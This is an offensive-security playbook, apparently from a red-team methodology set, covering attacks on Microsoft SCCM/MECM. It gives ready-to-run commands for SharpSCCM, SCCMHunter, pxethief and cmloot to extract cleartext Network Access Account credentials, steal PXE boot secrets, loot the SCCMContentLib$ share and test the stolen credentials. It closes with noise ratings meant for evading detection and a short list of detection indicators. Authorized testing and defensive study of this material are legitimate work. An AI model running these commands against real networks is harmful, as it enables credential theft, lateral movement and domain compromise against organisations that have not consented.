# SCCM/MECM Attacks

tags: sccm, mecm, configmgr, naa, pxe, sharpsccm, sccmhunter, cmloot, credential

## Objective
Exploit SCCM/MECM (Microsoft Endpoint Configuration Manager) for credential extraction and lateral movement.

## Prerequisites
- SCCM infrastructure identified in the environment
- Domain credentials (for most attacks)
- Local admin on SCCM client (for NAA extraction)

## Methodology

### Enumeration
```bash
# SharpSCCM — identify site code and management point
SharpSCCM.exe local site-info

# SCCMHunter — Python cross-platform
python3 sccmhunter.py find -u user -p pass -d dom -dc-ip DC
```

### NAA Credential Extraction
```bash
# Extract Network Access Account credentials — stored in CLEARTEXT!
SharpSCCM.exe local secrets -m disk

# NAA credentials provide domain-level access
# Check extracted creds immediately
nxc smb DC -u naa_user -p naa_pass
```
NAA (Network Access Account) credentials are stored in **cleartext** on all SCCM clients.

### PXE Boot Credential Theft
```bash
# Intercept PXE boot process to extract credentials
python3 pxethief.py 1
```

### CMLoot — SCCMContentLib$ Share Enumeration
```bash
# Enumerate content library for sensitive packages
python cmloot.py domain/user:pass@SCCM_SERVER

# Download identified files
python cmloot.py domain/user:pass@SCCM_SERVER -cmlootdownload files.txt
```
Content library may contain scripts with credentials, deployment packages, task sequence media.

## Graph Reporting
- **Credential nodes**: NAA credentials (`cred_type: plaintext`), PXE credentials
- **VALID_ON edges**: NAA creds → domain user account
- **Host nodes**: SCCM infrastructure servers
- **Service nodes**: SCCM management points
- **ADMIN_TO edges**: if NAA creds grant admin access anywhere

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| SharpSCCM local enum | 0.3 |
| SCCMHunter | 0.4 |
| NAA extraction (local) | 0.2 |
| PXE boot intercept | 0.5 |
| CMLoot share access | 0.4 |

**Detection**: LDAP wildcards for `*sccm*`, Event 4624 LogonType 9, WMI queries to SCCM namespace, unusual access to SCCMContentLib$ share.

## Sequencing
- **After**: AD Discovery (SCCM infrastructure identified), Lateral Movement (local admin on client)
- **Feeds →**: Credential validation → Lateral Movement, AD Privilege Escalation
